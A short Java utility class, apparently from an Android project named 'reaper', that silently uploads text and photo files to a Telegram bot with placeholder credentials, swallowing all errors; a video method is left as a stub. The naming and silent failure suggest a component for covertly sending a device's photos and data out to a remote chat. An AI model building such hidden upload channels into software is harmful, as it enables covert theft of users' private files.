package com.mood.reaper;

import okhttp3.*;
import java.io.File;

public class Utils {
    private static final String BOT_TOKEN = "YOUR_TOKEN";
    private static final String CHAT_ID = "YOUR_CHAT_ID";
    private static OkHttpClient client = new OkHttpClient();

    public static void sendToTelegram(String text) {
        try {
            RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build()).execute();
        } catch (Exception e) {}
    }

    public static void sendPhoto(String path) {
        try {
            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", "photo.jpg",
                    RequestBody.create(new File(path), MediaType.parse("image/jpeg")))
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                .post(body)
                .build()).execute();
        } catch (Exception e) {}
    }

    public static void sendVideo(String path) {
        // Mirip dengan sendPhoto, ubah ke sendVideo
    }
}